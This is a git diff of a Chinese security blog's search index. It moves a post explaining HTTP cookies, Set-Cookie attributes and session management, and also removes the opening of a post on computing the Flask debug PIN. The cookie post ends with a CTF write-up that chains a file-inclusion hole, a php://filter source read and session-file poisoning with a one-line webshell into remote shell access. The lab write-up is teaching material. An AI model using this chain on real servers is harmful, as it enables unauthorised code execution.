@@ -49,6 +49,83 @@
       </categories>
   </entry>
   <entry>
+    <title>Cookie和Session机制</title>
+    <url>/2023/10/23/Cookie%E5%92%8CSession/</url>
+    <content><![CDATA[<p>摘要</p>
+<span id="more"></span>
+
+<h1 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h1><h1 id="1-使用Cookie来管理状态"><a href="#1-使用Cookie来管理状态" class="headerlink" title="1. 使用Cookie来管理状态"></a>1. 使用Cookie来管理状态</h1><p>HTTP 是无状态协议，说明它不能以状态来区分和管理请求和响应。也就是说，无法根据之前的状态进行本次的请求处理。<br>不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的CPU 及内存资源的消耗。从另一侧面来说，也正是因为HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</p>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-dde997503ed9d450e2f39042d53d4307_1440w.png" class="">​
+
+<p>我们登录淘宝的时候首先要登录，我们看到了一个商品点进去，进行了页面跳转&#x2F;刷新，按照HTTP的无状态协议岂不是又要登录一次？<br>所以为了解决这个问题，Cookie诞生了，在保留无状态协议这个特征的同时又要解决类似记录状态的矛盾问题。Cookie 技术通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。<br>Cookie 会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie 值后发送出去。<br>服务器端发现客户端发送过来的Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
+<ul>
+<li>没有Cookie信息状态下的请求<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-85622297a93f493c891ffb90b67fd5e0_1440w.png" class="">​</li>
+<li>第2次以后（存有Cookie信息状态）的请求</li>
+</ul>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-1f49734871c5e2da2d264d28ac310a65_1440w.png" class="">​
+
+<p>上图很清晰地展示了发生Cookie 交互的情景。<br>HTTP 请求报文和响应报文的内容如下（数字和图中对应）。<br>①请求报文（没有Cookie 信息的状态）</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /reader/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">*首部字段内没有Cookie的相关信息</span><br></pre></td></tr></table></figure>
+
+<p>②响应报文（服务器端生成Cookie 信息）</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 12 Jul 2012 07:12:20 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>③请求报文（自动发送保存着的Cookie 信息）</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /image/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid=1342077140226724</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-关于Cookie-的首部字段"><a href="#2-关于Cookie-的首部字段" class="headerlink" title="2. 关于Cookie 的首部字段"></a>2. 关于Cookie 的首部字段</h1><img src="/2023/10/23/Cookie%E5%92%8CSession/v2-ba2f99ae66a2f4731ac8a176f562aac7_1440w.png" class="">​
+
+<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-b1147a2e2c3fbb6d6b46fdebda122ba3_1440w.png" class="">​
+
+<h2 id="2-1-Set-Cookie"><a href="#2-1-Set-Cookie" class="headerlink" title="2.1 Set-Cookie"></a>2.1 Set-Cookie</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; ⇒</span><br><span class="line">path=/; domain=.hackr.jp;</span><br></pre></td></tr></table></figure>
+
+<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了Set-Cookie 的字段值。</p>
+<h3 id="2-1-1Set-Cookie-字段的属性"><a href="#2-1-1Set-Cookie-字段的属性" class="headerlink" title="2.1.1Set-Cookie 字段的属性"></a>2.1.1Set-Cookie 字段的属性</h3><p><img src="https://pic4.zhimg.com/80/v2-d04615c640ec0b4fbb553cbc406eb057_1440w.webp">​</p>
+<h3 id="2-1-2-expires-属性"><a href="#2-1-2-expires-属性" class="headerlink" title="2.1.2 expires 属性"></a>2.1.2 expires 属性</h3><p>Cookie 的expires 属性指定浏览器可发送Cookie 的有效期。当省略expires 属性时，Cookie仅在浏览器关闭之前有效。<br>另外，一旦Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除Cookie 的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie 的实质性删除操作。</p>
+<h3 id="2-1-3-path-属性"><a href="#2-1-3-path-属性" class="headerlink" title="2.1.3 path 属性"></a>2.1.3 path 属性</h3><p>Cookie 的path 属性可用于限制指定Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
+<h3 id="2-1-4-domain-属性"><a href="#2-1-4-domain-属性" class="headerlink" title="2.1.4 domain 属性"></a>2.1.4 domain 属性</h3><p>通过Cookie 的domain 属性指定的域名可做到与结尾匹配一致。比如， 当指定<a href="http://example.com/">http://example.com</a> 后， 除<a href="http://example.com/">http://example.com</a> 以外，<a href="https://link.zhihu.com/?target=http://www.example.com">Example Domain</a>或www2.example.com 等都可以发送Cookie。因此，除了针对具体指定的多个域名发送Cookie 之外，不指定domain 属性显得更安全。</p>
+<h3 id="2-1-5-secure-属性"><a href="#2-1-5-secure-属性" class="headerlink" title="2.1.5 secure 属性"></a>2.1.5 secure 属性</h3><p>Cookie 的secure 属性用于限制Web 页面仅在HTTPS 安全连接时，才可以发送Cookie。发送Cookie 时，指定secure 属性的方法如下所示。<br>Set-Cookie: name&#x3D;value; secure<br>以上例子仅当在https ：&#x2F;&#x2F;<a href="https://link.zhihu.com/?target=http://www.example.com/">Example Domain</a>（HTTPS）安全连接的情况下才会进行Cookie 的回收。也就是说，即使域名相同时http : &#x2F;&#x2F;<a href="https://link.zhihu.com/?target=http://www.example.com/">Example Domain</a>（HTTP） 也不会发生Cookie 回收行为。当省略secure 属性时，不论HTTP 还是HTTPS，都会对Cookie 进行回收。</p>
+<h3 id="2-1-6-HttpOnly-属性"><a href="#2-1-6-HttpOnly-属性" class="headerlink" title="2.1.6 HttpOnly 属性"></a>2.1.6 HttpOnly 属性</h3><p>Cookie 的HttpOnly 属性是Cookie 的扩展功能，它使JavaScript 脚本无法获得Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对Cookie 的信息窃取。<br>发送指定HttpOnly 属性的Cookie 的方法如下所示。<br>Set-Cookie: name&#x3D;value; HttpOnly<br>通过上述设置，通常从Web 页面内还可以对Cookie 进行读取操作。但使用JavaScript 的document.cookie 就无法读取附加HttpOnly 属性后的Cookie 的内容了。因此，也就无法在XSS 中利用JavaScript 劫持Cookie 了。<br>虽然是独立的扩展功能，但Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止XSS 而开发的。</p>
+<h2 id="2-2-Cookie"><a href="#2-2-Cookie" class="headerlink" title="2.2 Cookie"></a>2.2 Cookie</h2><p>Cookie: status&#x3D;enable<br>首部字段Cookie 会告知服务器，当客户端想获得HTTP 状态管理支持时，就会在请求中包含从服务器接收到的Cookie。接收到多个Cookie 时，同样可以以多个Cookie 形式发送。</p>
+<h1 id="3-Session-管理及Cookie-应用"><a href="#3-Session-管理及Cookie-应用" class="headerlink" title="3 Session 管理及Cookie 应用"></a>3 Session 管理及Cookie 应用</h1><h2 id="3-1-什么是Session"><a href="#3-1-什么是Session" class="headerlink" title="3.1 什么是Session"></a>3.1 什么是Session</h2><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中。</p>
+<h2 id="3-2-通过Cookie来管理Session"><a href="#3-2-通过Cookie来管理Session" class="headerlink" title="3.2 通过Cookie来管理Session"></a>3.2 通过Cookie来管理Session</h2><p>基于表单认证的标准规范尚未有定论，一般会使用Cookie 来管理Session（会话）。<br>基于表单认证本身是通过服务器端的Web 应用，将客户端发送过来的用户ID 和密码与之前登录过的信息做匹配来进行认证的。<br>但鉴于HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用Cookie 来管理Session，以弥补HTTP 协议中不存在的状态管理功能。</p>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-0b02fa4a73a8072eb03cdf78270235e1_1440w.png" class="">​
+
+<p>Session 管理及Cookie 状态管理</p>
+<ul>
+<li>步骤一：客户端把用户ID 和密码等登录信息放入报文的实体部分，通常是以POST 方法把请求发送给服务器。而这时，会使用HTTPS 通信来进行HTML 表单画面的显示和用户输入数据的发送。</li>
+<li>步骤二：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。<br>向客户端返回响应时，会在首部字段Set-Cookie 内写入Session ID（如PHPSESSID&#x3D;028a8c…）。<br>你可以把Session ID 想象成一种用以区分不同用户的等位号。然而，如果Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。<br>另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在Cookie 内加上httponly 属性。</li>
+<li>步骤三：客户端接收到从服务器端发来的Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID 也随之发送到服务器。服务器端可通过验证接收到的Session ID 识别用户和其认证状态。</li>
+</ul>
+<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。<br>另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。<br>通常，一种安全的保存方法是，先利用给密码加盐（salt）A 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。</p>
+<h2 id="3-Cookie和Session实战"><a href="#3-Cookie和Session实战" class="headerlink" title="3.Cookie和Session实战"></a>3.Cookie和Session实战</h2><img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205344-1cgjfgk.png" class="" title="image">​
+
+<p>登录框随便输入后点击出现的两个链接任意都会发现URL处可能存在任意文件包含漏洞。</p>
+<p><strong>该题伪协议没有过滤，直接读</strong>​<code>action.php</code>​看下源码是什么：</p>
+<p><code>file=php://filter/read=convert.base64-encode/resource=action.php</code>​</p>
+<p><strong>base64解码得到源码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$name</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=action.php?file=<span class="number">1</span>.txt&gt;my dairy&lt;/a&gt;</span><br><span class="line">&lt;a href=action.php?file=<span class="number">2</span>.txt&gt;my booklist&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>​ 如果网上搜索以下会发现session文件包含的漏洞，因为获取不到</strong>​<code>phpinfo</code>​信息所以不清楚session存储路径，网上都说的是<code>/var/lib/php/session</code>​是默认路径，但是在不设置任何东西通过Docker搭建的PHP环境下该路径默认不存放session而是在<code>/tmp</code>​目录下会生成临时文件。</p>
+<p>接下来创建session文件，通过唯一可控的参数name，通过POST方式传递一个一句话木马。</p>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205651-jyb4vpk.png" class="" title="image">​
+
+<p><strong>当通过POST方式传递name变量的值会被存入到session中，会在</strong>​<code>/tmp</code>​目录下存储session的值。session的文件名为：<code>sess+sessionid</code>​，<code>sessionid</code>​可以通过开发者模式获取。 首先获取sessionid，按【F12】后单击“网络”，在Cookie处找到sessionid值：kda17pk0n9q7raev72n8ss4316</p>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205729-qfqqsnb.png" class="" title="image">​
+
+<p>拼接?file&#x3D;&#x2F;tmp&#x2F;sess_kda17pk0n9q7raev72n8ss4316</p>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009210245-6fcojr9.png" class="" title="image">
+
+<p>蚁剑成功getshell。</p>
+<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009210318-00e1ae2.png" class="" title="image">​
+
+<p>‍</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CSRF跨站请求伪造漏洞</title>
     <url>/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>摘要</p>
@@ -212,83 +289,6 @@
 <p>‍</p>
 <p>‍</p>
 <p>‍</p>
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Cookie和Session机制</title>
-    <url>/2023/10/23/Cookie%E5%92%8CSession/</url>
-    <content><![CDATA[<p>摘要</p>
-<span id="more"></span>
-
-<h1 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h1><h1 id="1-使用Cookie来管理状态"><a href="#1-使用Cookie来管理状态" class="headerlink" title="1. 使用Cookie来管理状态"></a>1. 使用Cookie来管理状态</h1><p>HTTP 是无状态协议，说明它不能以状态来区分和管理请求和响应。也就是说，无法根据之前的状态进行本次的请求处理。<br>不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的CPU 及内存资源的消耗。从另一侧面来说，也正是因为HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</p>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-dde997503ed9d450e2f39042d53d4307_1440w.png" class="">​
-
-<p>我们登录淘宝的时候首先要登录，我们看到了一个商品点进去，进行了页面跳转&#x2F;刷新，按照HTTP的无状态协议岂不是又要登录一次？<br>所以为了解决这个问题，Cookie诞生了，在保留无状态协议这个特征的同时又要解决类似记录状态的矛盾问题。Cookie 技术通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。<br>Cookie 会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie 值后发送出去。<br>服务器端发现客户端发送过来的Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
-<ul>
-<li>没有Cookie信息状态下的请求<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-85622297a93f493c891ffb90b67fd5e0_1440w.png" class="">​</li>
-<li>第2次以后（存有Cookie信息状态）的请求</li>
-</ul>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-1f49734871c5e2da2d264d28ac310a65_1440w.png" class="">​
-
-<p>上图很清晰地展示了发生Cookie 交互的情景。<br>HTTP 请求报文和响应报文的内容如下（数字和图中对应）。<br>①请求报文（没有Cookie 信息的状态）</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /reader/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">*首部字段内没有Cookie的相关信息</span><br></pre></td></tr></table></figure>
-
-<p>②响应报文（服务器端生成Cookie 信息）</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 12 Jul 2012 07:12:20 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br></pre></td></tr></table></figure>
-
-<p>③请求报文（自动发送保存着的Cookie 信息）</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /image/ HTTP/1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid=1342077140226724</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-关于Cookie-的首部字段"><a href="#2-关于Cookie-的首部字段" class="headerlink" title="2. 关于Cookie 的首部字段"></a>2. 关于Cookie 的首部字段</h1><img src="/2023/10/23/Cookie%E5%92%8CSession/v2-ba2f99ae66a2f4731ac8a176f562aac7_1440w.png" class="">​
-
-<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-b1147a2e2c3fbb6d6b46fdebda122ba3_1440w.png" class="">​
-
-<h2 id="2-1-Set-Cookie"><a href="#2-1-Set-Cookie" class="headerlink" title="2.1 Set-Cookie"></a>2.1 Set-Cookie</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; ⇒</span><br><span class="line">path=/; domain=.hackr.jp;</span><br></pre></td></tr></table></figure>
-
-<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了Set-Cookie 的字段值。</p>
-<h3 id="2-1-1Set-Cookie-字段的属性"><a href="#2-1-1Set-Cookie-字段的属性" class="headerlink" title="2.1.1Set-Cookie 字段的属性"></a>2.1.1Set-Cookie 字段的属性</h3><p><img src="https://pic4.zhimg.com/80/v2-d04615c640ec0b4fbb553cbc406eb057_1440w.webp">​</p>
-<h3 id="2-1-2-expires-属性"><a href="#2-1-2-expires-属性" class="headerlink" title="2.1.2 expires 属性"></a>2.1.2 expires 属性</h3><p>Cookie 的expires 属性指定浏览器可发送Cookie 的有效期。当省略expires 属性时，Cookie仅在浏览器关闭之前有效。<br>另外，一旦Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除Cookie 的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie 的实质性删除操作。</p>
-<h3 id="2-1-3-path-属性"><a href="#2-1-3-path-属性" class="headerlink" title="2.1.3 path 属性"></a>2.1.3 path 属性</h3><p>Cookie 的path 属性可用于限制指定Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
-<h3 id="2-1-4-domain-属性"><a href="#2-1-4-domain-属性" class="headerlink" title="2.1.4 domain 属性"></a>2.1.4 domain 属性</h3><p>通过Cookie 的domain 属性指定的域名可做到与结尾匹配一致。比如， 当指定<a href="http://example.com/">http://example.com</a> 后， 除<a href="http://example.com/">http://example.com</a> 以外，<a href="https://link.zhihu.com/?target=http://www.example.com">Example Domain</a>或www2.example.com 等都可以发送Cookie。因此，除了针对具体指定的多个域名发送Cookie 之外，不指定domain 属性显得更安全。</p>
-<h3 id="2-1-5-secure-属性"><a href="#2-1-5-secure-属性" class="headerlink" title="2.1.5 secure 属性"></a>2.1.5 secure 属性</h3><p>Cookie 的secure 属性用于限制Web 页面仅在HTTPS 安全连接时，才可以发送Cookie。发送Cookie 时，指定secure 属性的方法如下所示。<br>Set-Cookie: name&#x3D;value; secure<br>以上例子仅当在https ：&#x2F;&#x2F;<a href="https://link.zhihu.com/?target=http://www.example.com/">Example Domain</a>（HTTPS）安全连接的情况下才会进行Cookie 的回收。也就是说，即使域名相同时http : &#x2F;&#x2F;<a href="https://link.zhihu.com/?target=http://www.example.com/">Example Domain</a>（HTTP） 也不会发生Cookie 回收行为。当省略secure 属性时，不论HTTP 还是HTTPS，都会对Cookie 进行回收。</p>
-<h3 id="2-1-6-HttpOnly-属性"><a href="#2-1-6-HttpOnly-属性" class="headerlink" title="2.1.6 HttpOnly 属性"></a>2.1.6 HttpOnly 属性</h3><p>Cookie 的HttpOnly 属性是Cookie 的扩展功能，它使JavaScript 脚本无法获得Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对Cookie 的信息窃取。<br>发送指定HttpOnly 属性的Cookie 的方法如下所示。<br>Set-Cookie: name&#x3D;value; HttpOnly<br>通过上述设置，通常从Web 页面内还可以对Cookie 进行读取操作。但使用JavaScript 的document.cookie 就无法读取附加HttpOnly 属性后的Cookie 的内容了。因此，也就无法在XSS 中利用JavaScript 劫持Cookie 了。<br>虽然是独立的扩展功能，但Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止XSS 而开发的。</p>
-<h2 id="2-2-Cookie"><a href="#2-2-Cookie" class="headerlink" title="2.2 Cookie"></a>2.2 Cookie</h2><p>Cookie: status&#x3D;enable<br>首部字段Cookie 会告知服务器，当客户端想获得HTTP 状态管理支持时，就会在请求中包含从服务器接收到的Cookie。接收到多个Cookie 时，同样可以以多个Cookie 形式发送。</p>
-<h1 id="3-Session-管理及Cookie-应用"><a href="#3-Session-管理及Cookie-应用" class="headerlink" title="3 Session 管理及Cookie 应用"></a>3 Session 管理及Cookie 应用</h1><h2 id="3-1-什么是Session"><a href="#3-1-什么是Session" class="headerlink" title="3.1 什么是Session"></a>3.1 什么是Session</h2><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中。</p>
-<h2 id="3-2-通过Cookie来管理Session"><a href="#3-2-通过Cookie来管理Session" class="headerlink" title="3.2 通过Cookie来管理Session"></a>3.2 通过Cookie来管理Session</h2><p>基于表单认证的标准规范尚未有定论，一般会使用Cookie 来管理Session（会话）。<br>基于表单认证本身是通过服务器端的Web 应用，将客户端发送过来的用户ID 和密码与之前登录过的信息做匹配来进行认证的。<br>但鉴于HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用Cookie 来管理Session，以弥补HTTP 协议中不存在的状态管理功能。</p>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/v2-0b02fa4a73a8072eb03cdf78270235e1_1440w.png" class="">​
-
-<p>Session 管理及Cookie 状态管理</p>
-<ul>
-<li>步骤一：客户端把用户ID 和密码等登录信息放入报文的实体部分，通常是以POST 方法把请求发送给服务器。而这时，会使用HTTPS 通信来进行HTML 表单画面的显示和用户输入数据的发送。</li>
-<li>步骤二：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。<br>向客户端返回响应时，会在首部字段Set-Cookie 内写入Session ID（如PHPSESSID&#x3D;028a8c…）。<br>你可以把Session ID 想象成一种用以区分不同用户的等位号。然而，如果Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。<br>另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在Cookie 内加上httponly 属性。</li>
-<li>步骤三：客户端接收到从服务器端发来的Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID 也随之发送到服务器。服务器端可通过验证接收到的Session ID 识别用户和其认证状态。</li>
-</ul>
-<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。<br>另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。<br>通常，一种安全的保存方法是，先利用给密码加盐（salt）A 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。</p>
-<h2 id="3-Cookie和Session实战"><a href="#3-Cookie和Session实战" class="headerlink" title="3.Cookie和Session实战"></a>3.Cookie和Session实战</h2><img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205344-1cgjfgk.png" class="" title="image">​
-
-<p>登录框随便输入后点击出现的两个链接任意都会发现URL处可能存在任意文件包含漏洞。</p>
-<p><strong>该题伪协议没有过滤，直接读</strong>​<code>action.php</code>​看下源码是什么：</p>
-<p><code>file=php://filter/read=convert.base64-encode/resource=action.php</code>​</p>
-<p><strong>base64解码得到源码</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$name</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=action.php?file=<span class="number">1</span>.txt&gt;my dairy&lt;/a&gt;</span><br><span class="line">&lt;a href=action.php?file=<span class="number">2</span>.txt&gt;my booklist&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>​ 如果网上搜索以下会发现session文件包含的漏洞，因为获取不到</strong>​<code>phpinfo</code>​信息所以不清楚session存储路径，网上都说的是<code>/var/lib/php/session</code>​是默认路径，但是在不设置任何东西通过Docker搭建的PHP环境下该路径默认不存放session而是在<code>/tmp</code>​目录下会生成临时文件。</p>
-<p>接下来创建session文件，通过唯一可控的参数name，通过POST方式传递一个一句话木马。</p>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205651-jyb4vpk.png" class="" title="image">​
-
-<p><strong>当通过POST方式传递name变量的值会被存入到session中，会在</strong>​<code>/tmp</code>​目录下存储session的值。session的文件名为：<code>sess+sessionid</code>​，<code>sessionid</code>​可以通过开发者模式获取。 首先获取sessionid，按【F12】后单击“网络”，在Cookie处找到sessionid值：kda17pk0n9q7raev72n8ss4316</p>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009205729-qfqqsnb.png" class="" title="image">​
-
-<p>拼接?file&#x3D;&#x2F;tmp&#x2F;sess_kda17pk0n9q7raev72n8ss4316</p>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009210245-6fcojr9.png" class="" title="image">
-
-<p>蚁剑成功getshell。</p>
-<img src="/2023/10/23/Cookie%E5%92%8CSession/image-20231009210318-00e1ae2.png" class="" title="image">​
-
 <p>‍</p>
 ]]></content>
       <categories>
@@ -1862,68 +1862,6 @@
       </categories>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/10/23/Python/flask/</url>
-    <content><![CDATA[<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><h2 id="1-debug——PIN"><a href="#1-debug——PIN" class="headerlink" title="1.debug——PIN"></a>1.debug——PIN</h2><p>考点：最新版本werkzeugd下的flask_pin码的求值</p>
-<p>Flask debug pin的安全问题详细分析参考看<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a>，且大佬也给出了利用脚本。需要重点关注的也就是6个参数</p>
-<p>‍</p>
-<p><strong>username 启动这个Flask的用户</strong></p>
-<p><strong>modname 一般默认flask.app</strong></p>
-<p><strong>getattr(app, ‘name’, getattr(app.class, ‘name‘)) 一般默认flask.app为Flask</strong></p>
-<p><strong>getattr(mod, ‘file’, None)为flask目录下的一个app.py的绝对路径,可在报错页面看到</strong></p>
-<p><strong>str(uuid.getnode()) 则是网卡mac地址的十进制表达式</strong></p>
-<p><strong>get_machine_id() 系统id</strong></p>
-<p>‍</p>
-<p>由于pin码构建需要这6个参数，但不同环境下，参数会有变化，除了默认不变的参数，其他参数我们可以这样获得：</p>
-<p><strong>username</strong></p>
